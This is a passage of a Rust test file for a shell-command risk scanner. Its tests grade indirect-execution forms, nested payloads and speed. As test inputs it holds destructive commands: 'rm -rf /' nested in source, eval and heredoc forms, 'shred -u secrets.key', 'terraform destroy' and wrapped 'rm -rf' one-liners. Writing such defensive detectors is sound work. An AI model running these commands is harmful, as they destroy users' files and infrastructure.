            ("sh <(generate_config.sh)", RiskLevel::Warn),
            ("bash <(cat bootstrap.sh)", RiskLevel::Warn),
            // ── EXEC-007: source <(...) ──────────────────────────────────────
            ("source <(kubectl completion bash)", RiskLevel::Warn),
            ("source <(helm completion zsh)", RiskLevel::Warn),
        ];

        for (cmd, expected) in cases {
            let assessment = s.assess(cmd);
            assert_eq!(
                assessment.risk, *expected,
                "indirect execution form {cmd:?}: got {:?}, expected {expected:?}",
                assessment.risk,
            );
        }
    }

    #[test]
    fn indirect_execution_safe_commands_not_flagged() {
        let s = scanner();

        // Commands that superficially resemble indirect execution patterns but are safe.
        for cmd in [
            "python3 script.py",
            "node server.js",
            "perl script.pl",
            "echo hello world",
            "echo hello | grep foo",
            "source ~/.bashrc",
            ". ~/.profile",
        ] {
            let assessment = s.assess(cmd);
            assert_eq!(
                assessment.risk,
                RiskLevel::Safe,
                "expected Safe for {cmd:?}, got {:?}",
                assessment.risk,
            );
        }
    }

    #[test]
    fn indirect_execution_dangerous_body_escalates_risk() {
        let s = scanner();

        // A dangerous payload inside an inline interpreter invocation is caught
        // by the per-inline-script body scan and escalates risk beyond Warn.
        let cases: &[(&str, RiskLevel)] = &[
            // EXEC-002 (Warn) + FS-004 shred in body (Danger) → Danger
            (
                "python3 -c \"import os; os.system('shred -u secrets.key')\"",
                RiskLevel::Danger,
            ),
            // EXEC-003 (Warn) + CL-001 terraform destroy in body (Danger) → Danger
            (
                "node -e \"require('cp').execSync('terraform destroy')\"",
                RiskLevel::Danger,
            ),
            // EXEC-004 (Warn) + FS-001 rm -rf in body (Danger) → Danger
            (
                "perl -e 'system(\"rm -rf /home/user/project\")'",
                RiskLevel::Danger,
            ),
            // EXEC-001: echo|sh wrapping a dangerous payload — both EXEC-001 and
            // the contained pattern fire, result is still Danger (max of both).
            ("echo 'terraform destroy' | sh", RiskLevel::Danger),
        ];

        for (cmd, expected) in cases {
            let assessment = s.assess(cmd);
            assert_eq!(
                assessment.risk, *expected,
                "dangerous body escalation {cmd:?}: got {:?}, expected {expected:?}",
                assessment.risk,
            );
        }
    }

    #[test]
    fn nested_execution_recursive_payloads_escalate_to_inner_risk() {
        let s = scanner();

        let cases: &[(&str, RiskLevel)] = &[
            (r#"source <(bash -c 'rm -rf /')"#, RiskLevel::Block),
            (r#"eval "bash -c 'rm -rf /'""#, RiskLevel::Block),
            ("bash <<'EOF'\nbash -c 'rm -rf /'\nEOF", RiskLevel::Block),
            (
                r#"bash -c 'source <(bash -c "rm -rf /")'"#,
                RiskLevel::Block,
            ),
        ];

        for (cmd, expected) in cases {
            let assessment = s.assess(cmd);
            assert_eq!(
                assessment.risk, *expected,
                "recursive nested payload {cmd:?}: got {:?}, expected {expected:?}",
                assessment.risk,
            );
        }
    }

    // ── performance ──────────────────────────────────────────────────────────

    #[test]
    fn ten_thousand_safe_commands_under_25ms() {
        let s = scanner();
        let safe_cmd = "echo hello world";

        let start = std::time::Instant::now();
        for _ in 0..10_000 {
            let _ = std::hint::black_box(s.quick_scan(safe_cmd));
        }
        let elapsed = start.elapsed();

        assert!(
            elapsed.as_millis() < 25,
            "10,000 quick_scan calls took {}ms ({}µs), expected < 25ms",
            elapsed.as_millis(),
            elapsed.as_micros(),
        );
    }
}
